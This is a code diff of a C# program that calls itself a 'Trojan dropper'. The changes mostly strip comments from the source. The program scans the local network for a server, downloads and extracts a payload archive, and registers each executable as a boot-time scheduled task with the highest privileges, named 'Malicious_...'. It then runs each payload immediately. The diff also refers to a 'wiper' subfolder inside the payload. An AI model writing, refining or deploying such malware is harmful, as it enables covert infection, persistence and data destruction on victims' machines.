@@ -13,7 +13,6 @@ using System.Threading.Tasks;
 
 namespace App
 {
-    // --- MODIFIED: Logger class updated for new file name format ---
     public static class Logger
     {
         private static string _logFilePath;
@@ -24,7 +23,6 @@ namespace App
         {
             if (_initialized) return;
 
-            // Use the agreed-upon file name format
             string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
             _logFilePath = Path.Combine(baseDirectory, $"Trojan_log_{timestamp}.txt");
 
@@ -35,7 +33,7 @@ namespace App
         public static void Log(string message)
         {
             string logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
-            Console.WriteLine(logEntry); // Always write to console for real-time view
+            Console.WriteLine(logEntry);
 
             if (_initialized)
             {
@@ -61,8 +59,6 @@ namespace App
         private const int MaxParallelScans = 50;
         private static bool serverFoundAndDownloaded = false;
         private const string PayloadZipFileName = "payload.zip";
-
-        // --- MODIFIED: Renamed payload directory ---
         private const string PayloadExtractDir = "payload";
 
         private static IPAddress GetLocalIPAddress()
@@ -129,7 +125,7 @@ namespace App
                             }
                         }
                     }
-                    catch { /* Ignore exceptions for closed ports */ }
+                    catch { }
                     finally
                     {
                         semaphore.Release();
@@ -200,12 +196,10 @@ namespace App
             }
         }
 
-        // --- NEW: Helper method to create scheduled tasks ---
         private static void CreateScheduledTask(string exePath, string taskName, string serverIp)
         {
             Logger.Log($"Attempting to create scheduled task '{taskName}' for '{Path.GetFileName(exePath)}'");
 
-            // Command to delete any existing task with the same name
             string deleteArgs = $"/Delete /TN \"{taskName}\" /F";
             var deleteInfo = new ProcessStartInfo("schtasks.exe", deleteArgs)
             {
@@ -214,10 +208,6 @@ namespace App
             };
             Process.Start(deleteInfo)?.WaitForExit();
 
-            // Command to create the new task
-            // /SC ONSTART: Runs when the system boots
-            // /RL HIGHEST: Runs with highest available privileges for the user
-            // /TR: The command to run, with quotes to handle spaces and the server IP as an argument
             string createArgs = $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\" \\\"{serverIp}\\\"\" /RL HIGHEST /F";
             var createInfo = new ProcessStartInfo("schtasks.exe", createArgs)
             {
@@ -241,29 +231,29 @@ namespace App
             }
         }
 
-        // --- NEW: Core logic to create tasks and execute all payloads ---
         private static void CreateTasksAndExecutePayloads(string extractPath, string serverIp)
         {
-            Logger.Log("Scanning for executables in payload directory...");
-            string[] executables = Directory.GetFiles(extractPath, "*.exe", SearchOption.AllDirectories);
+            Logger.Log("Scanning for executables in the top-level payload directory...");
+
+            // --- MODIFIED: Changed SearchOption to TopDirectoryOnly ---
+            // This finds .exe files in the 'payload' folder but NOT in subfolders like 'payload/wiper'.
+            string[] executables = Directory.GetFiles(extractPath, "*.exe", SearchOption.TopDirectoryOnly);
 
             if (executables.Length == 0)
             {
-                Logger.Log("[WARNING] No .exe files found in the payload directory.");
+                Logger.Log("[WARNING] No .exe files found in the top-level payload directory.");
                 return;
             }
 
-            Logger.Log($"Found {executables.Length} executables. Processing each...");
+            Logger.Log($"Found {executables.Length} executables to activate. Processing each...");
 
             foreach (string exePath in executables)
             {
                 string exeName = Path.GetFileName(exePath);
                 string taskName = $"Malicious_{Path.GetFileNameWithoutExtension(exeName)}";
 
-                // 1. Create the scheduled task for persistence
                 CreateScheduledTask(exePath, taskName, serverIp);
 
-                // 2. Execute the payload immediately
                 try
                 {
                     Logger.Log($"Executing '{exeName}' immediately...");
@@ -306,7 +296,6 @@ namespace App
 
         static async Task Main()
         {
-            // --- MODIFIED: Main logic flow updated to match our plan ---
             Logger.Initialize(AppContext.BaseDirectory);
             Logger.Log("Trojan dropper started.");
 
